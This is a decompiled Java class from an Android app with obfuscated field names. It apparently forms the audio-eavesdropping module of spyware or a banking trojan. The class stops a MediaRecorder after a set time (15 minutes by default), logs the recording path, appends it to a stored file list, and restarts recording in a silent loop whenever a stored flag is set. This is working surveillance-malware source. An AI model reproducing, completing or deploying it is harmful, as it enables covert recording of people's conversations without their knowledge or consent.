package com.example.mmm.service;

import android.media.*;
import com.example.mmm.Service.*;
import android.content.*;
import com.example.mmm.Utils.*;

final class srvRecordAudio$Runnable implements Runnable
{
    final int sorted$;
    final MediaRecorder animated$;
    final String valve$;
    final Context attitude$;
    final srvRecordAudio xanax$;
    
    srvRecordAudio$Runnable(final srvRecordAudio xanax$, final int sorted$, final MediaRecorder animated$, final String valve$, final Context attitude$) {
        this.xanax$ = xanax$;
        this.sorted$ = sorted$;
        this.animated$ = animated$;
        this.valve$ = valve$;
        this.attitude$ = attitude$;
        super();
    }
    
    @Override
    public final void run() {
        if (this.sorted$ == -1) {
            Thread.sleep(900000L);
        }
        else {
            Thread.sleep(this.sorted$ * 1000);
        }
        this.xanax$.brunei$.Log("SOUND", "STOP RECORD SOUND");
        this.animated$.stop();
        this.animated$.release();
        final utils brunei$ = this.xanax$.brunei$;
        final String s = "FILE";
        final StringBuilder sb = new StringBuilder();
        sb.append(this.valve$);
        brunei$.Log(s, sb.toString());
        final String settingsRead = this.xanax$.brunei$.SettingsRead(this.attitude$, "FF");
        final StringBuilder sb2 = new StringBuilder();
        sb2.append(settingsRead);
        sb2.append("###");
        sb2.append(this.valve$);
        this.xanax$.brunei$.SettingsWrite(this.attitude$, "FF", sb2.toString());
        if (this.sorted$ != -1) {
            this.xanax$.brunei$.SettingsWrite(this.attitude$, "SS", "");
            return;
        }
        if (this.xanax$.brunei$.SettingsRead(this.attitude$, "WR").equals("1")) {
            this.xanax$.startService(new Intent(this.attitude$, (Class)srvRecordAudio.class).putExtra("tick", "-1").putExtra("name", "record_audio"));
            return;
        }
        this.xanax$.brunei$.SettingsWrite(this.attitude$, "SS", "");
    }
}
